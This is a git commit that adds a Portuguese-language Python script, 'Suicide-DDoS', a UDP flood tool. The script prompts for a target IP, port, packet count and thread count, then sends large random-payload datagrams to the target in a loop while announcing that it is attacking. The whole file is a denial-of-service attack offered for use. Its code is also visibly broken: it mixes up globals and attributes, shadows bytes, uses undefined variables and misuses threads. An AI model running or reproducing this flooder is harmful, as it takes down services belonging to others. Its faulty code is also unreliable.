658300a60e772442e09db047f85575d2f82b87c6
t4ucci <121598329+t4ucci@users.noreply.github.com>
2023-01-19 13:10:39 -0300

    Add files via upload

---
+++ t4ucci.py
@@ -0,0 +1,74 @@
+import random
+import socket
+import os
+import time
+import threading
+
+print("  Suicide-DDoS  \n  by: t4ucci")
+print("""
+░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░
+░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
+░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
+░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
+░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
+█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
+█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
+░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░
+░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░
+░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
+░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░
+░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
+░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
+░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
+░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░
+""")
+
+print("Iniciando programa..")
+
+for i in range(3+1):
+    time.sleep(1)
+    print(f"\n{i}..")
+
+print("\n   Divirta-se!\n")
+ 
+class SenderBite:
+       def __init__(self, host, ports, packets, threadi):
+              self.host = host
+              self.ports = ports
+              self.packets = packets
+              self.threadi = threadi
+
+       def start(self):
+              bytes = random._urandom(25000)
+              envios = 0
+              while True:
+                     try:
+                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                            s.connect((ip,port))
+                            for i in range(packs):
+                                   s.sendto(bytes, (ip, port))
+                                   envios += 1
+                                   print('Atacando agora: '+ip+' || Enviando: '+str(envios))
+                     except:
+                            if not packs:
+                                   pergunta = str(input("Voltar?: [S/N]"))
+                            elif pergunta == 'S':
+                                   s.sendto(bytes(ip,port))
+                                   envios += 1
+                                   print('Atacando agora: '+ip+' || Enviando:'+str(envio))
+                            else:
+                                   print("[♤] O ataque está procedendo...")
+                                   s.close()
+                                   break
+                            s.close()
+                            print(">>> O ataque pode fechar em breve!")
+                            for x in range(thread):
+                                   thred = threading.Thread(target=start)
+                                   thred.start()
+  
+ip = str(input("[♤] Endereço: "))
+port = int(input("[♤] Porta: "))
+packs = int(input("[♤] Quant. Pacotes: "))
+thread = int(input("[♤] Velocidade do Envio: "))                                                                         
+sender = SenderBite(ip,port,packs,thread)
+sender.start()
